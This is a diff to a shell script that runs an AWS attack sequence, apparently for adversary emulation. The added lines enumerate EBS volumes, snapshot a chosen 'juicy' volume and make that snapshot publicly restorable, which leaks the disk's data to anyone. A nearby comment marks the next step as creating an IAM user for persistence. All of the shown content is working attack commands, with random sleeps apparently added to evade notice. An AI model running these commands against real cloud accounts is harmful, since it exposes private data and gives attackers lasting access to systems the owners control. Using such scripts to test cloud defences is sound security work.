@@ -62,10 +62,18 @@ aws sts get-caller-identity
 randomSleep
 
 # Enumerate EBS volumes
-echo "Sharing db-backups snapshot publicly"
-snapshotId=$(aws ec2 describe-snapshots --owner-ids self | jq -r '.Snapshots[] | select(.Description == "db-backups-20220829") | .SnapshotId')
+echo "Listing EBS volumes and finding a juicy one"
+VOLUME_ID=$(aws ec2 describe-volumes | jq -r '.Volumes[] | select(.Size == 1) | .VolumeId')
+
+echo "Taking snapshot of $VOLUME_ID"
+SNAPSHOT_ID=$(aws ec2 create-snapshot --volume-id $VOLUME_ID | jq -r .SnapshotId)
+
+echo "Waiting for snapshot"
+aws ec2 wait snapshot-completed --filters Name=snapshot-id,Values=$SNAPSHOT_ID
+
+echo "Sharing snapshot publicly"
 randomSleep
-aws ec2 modify-snapshot-attribute --snapshot-id $snapshotId --attribute createVolumePermission --operation-type add --group-names all
+aws ec2 modify-snapshot-attribute --snapshot-id $SNAPSHOT_ID --attribute createVolumePermission --operation-type add --group-names all
 
 # Create an IAM user for persistence
 sleep 10
